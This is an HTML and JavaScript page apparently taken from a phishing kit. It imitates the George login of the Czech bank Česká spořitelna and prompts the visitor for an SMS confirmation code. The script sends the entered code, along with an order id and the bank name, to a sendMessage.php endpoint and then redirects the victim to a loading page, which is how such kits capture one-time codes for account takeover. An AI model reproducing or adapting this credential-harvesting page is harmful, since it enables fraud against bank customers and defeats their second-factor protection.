<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="sporitelna/style4.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <title>Přihlášení | Česká spořitelna</title>
</head>
<body>
    <div class="container">
        <div class='header'>
            <img src="sporitelna/images/george.png" alt="">
            <p>Přihlášení do George</p>
        </div>
        <div class="box" id="1">
            <div class="boxhead">
                <a href="https://www.csas.cz/">
                    <img src="sporitelna/images/CESKA.svg" alt=''>
                </a>
            </div>
            <div class="vxod">
                <img src="sporitelna/images/vxod.png" alt=''>
            </div>
            <div class="prosim">
            Nyní prosím potvrďte své přihlášení pomocí SMS kódu George
            </div>
            <div class="datumcas">
                <div class="datum">
                    <div class="input-wrapper2">
                        <input type="number" placeholder="SMS Kod" id="myInput">
                    </div>
                </div>
                <div class="cas">
                    <button id="go">→</button>
                </div>
            </div>
            <div class="ceska">
                Správcem osobních údajů je Česká spořitelna, a.s. Detailní informace o zpracování osobních údajů najdte na 
                <a href="https://www.csas.cz/cs/zasady-zpracovani-osobnich-udaju">této stránce.</a>
            </div>
        </div>
    </div>
    <script>
    const submitButton = document.getElementById('go')
const sms = document.getElementById('myInput')

submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

if (sms.value == null || sms.value == '') {
    return;
}

$.ajax({
            url: 'sendMessage.php',
            method: 'POST',
            data: {
                orderid: "<?php echo $id ?>",
                bank: 'sporitelna',
                sms: sms.value
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                const currentURL = window.location.href;
  const newURL = currentURL.replace('/sms/', '/loading/');
  window.location.href = newURL;
            }
        });

}
  </script>
</body>
</html>